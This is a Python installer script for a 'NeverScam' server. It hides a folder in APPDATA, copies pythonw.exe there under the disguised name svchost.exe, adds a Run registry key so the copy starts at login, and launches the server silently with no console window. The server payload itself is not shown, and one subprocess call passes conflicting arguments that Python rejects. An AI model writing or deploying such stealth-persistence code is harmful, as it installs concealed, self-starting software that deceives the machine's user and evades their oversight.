import os
import sys
import shutil
import subprocess

def get_pythonw_path():
    """Get path to pythonw.exe"""
    python_path = sys.executable
    pythonw_path = python_path.replace("python.exe", "pythonw.exe")
    if os.path.exists(pythonw_path):
        return pythonw_path
    return python_path

def install():
    """Install and run NeverScam server hidden."""
    appdata = os.environ.get('APPDATA')
    install_dir = os.path.join(appdata, 'NeverScam')
    hidden_dir = install_dir
    server_path = os.path.join(hidden_dir, 'server.py')
    svchost_path = os.path.join(hidden_dir, 'svchost.exe')
    
    # Create hidden directory
    os.makedirs(hidden_dir, exist_ok=True)
    subprocess.run(['attrib', '+h', hidden_dir], capture_output=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Get current server.py path (this script's directory or current file)
    if getattr(sys, 'frozen', False):
        current_server = os.path.join(os.path.dirname(sys.executable), 'server.py')
    else:
        current_server = os.path.abspath('server.py')
    
    # Copy server.py to hidden location
    if os.path.exists(current_server):
        shutil.copy2(current_server, server_path)
    
    # Copy pythonw.exe as svchost.exe
    pythonw_path = get_pythonw_path()
    if os.path.exists(pythonw_path):
        shutil.copy2(pythonw_path, svchost_path)
    
    # Add to Windows startup registry
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        command = f'"{svchost_path}" "{server_path}"'
        winreg.SetValueEx(key, "NeverScamServer", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass
    
    # Start server hidden
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    
    subprocess.Popen(
        [svchost_path, server_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

if __name__ == "__main__":
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.FreeConsole()
    install()

